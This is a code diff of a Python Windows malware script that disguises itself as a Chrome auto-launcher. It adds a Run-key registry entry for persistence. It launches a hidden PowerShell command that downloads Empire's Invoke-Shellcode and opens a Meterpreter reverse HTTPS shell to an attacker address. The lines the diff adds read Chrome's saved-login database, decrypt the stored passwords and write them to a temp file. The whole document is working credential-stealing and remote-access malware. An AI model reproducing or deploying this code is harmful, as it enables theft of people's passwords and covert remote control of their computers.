@@ -6,6 +6,9 @@ import time
 import os
 import socket
 import urllib
+import sqlite3
+import win32crypt
+import sys
 
 NO_IP_HOST = 'googlechromeauto.serveirc.com'
 LHOST = '192.168.1.3'
@@ -15,7 +18,7 @@ TIME_SLEEP = 5
 TEMP_PATH = tempfile.gettempdir()
 REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
 REG_NAME = "GoogleChromeAutoLaunch_9921366102WEAD21312ESAD31312"
-REG_VALUE = '"' + TEMP_PATH + '\GoogleChromeAutoLaunch.scr' + '"' + ' --no-startup-window /prefetch:5'
+REG_VALUE = '"' + TEMP_PATH + '\GoogleChromeAutoLaunch.exe' + '"' + ' --no-startup-window /prefetch:5'
 
 def set_reg_key_value(REG_PATH, name, value):
     try:
@@ -39,7 +42,6 @@ def fire():
             subprocess.Popen("C:\Windows\System32\WindowsPowerShell\/v1.0\powershell.exe -noprofile -windowstyle hidden -noninteractive -noprofile -windowstyle hidden -noninteractive iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force;" % (LHOST,LPORT), shell=True)
         except WindowsError:
             pass
-
 
 def run_after_close():
     foundIT = False
@@ -72,10 +74,51 @@ def check_no_ip_online():
             get_noip_ip_address()
             break
 
+def dump_google_password():
+    try:
+        path = sys.argv[1]
+    except IndexError:
+        for w in os.walk(os.getenv('USERPROFILE')):
+            if 'Chrome' in w[1]:
+                path = str(w[0]) + '\Chrome\User Data\Default\Login Data'
+
+    # Connect to the Database
+    try:
+        conn = sqlite3.connect(path)
+        cursor = conn.cursor()
+    except Exception:
+        sys.exit(1)
+
+    # Get the results
+    try:
+        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+    except Exception:
+        sys.exit(1)
+
+    data = cursor.fetchall()
+
+    if len(data) > 0:
+        GoogleAutoPassPath = TEMP_PATH + '//GoogleAutoPass'
+        passGoogle = open(GoogleAutoPassPath,'w')
+        for result in data:
+            # Decrypt the Password
+            try:
+                password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
+            except Exception:
+                pass
+            if password:
+                try:
+                    passGoogle.write("[+] URL: %s \n    Username: %s \n    Password: %s \n" % (result[0], result[1], password))
+                except Exception:
+                    pass
+        passGoogle.close()
+    else:
+        sys.exit(0)
 
 # set the reg value in run key
 set_reg_key_value(REG_PATH,REG_NAME,REG_VALUE)
 
+dump_google_password()
 # fire the payload
 fire()
 time.sleep(5)
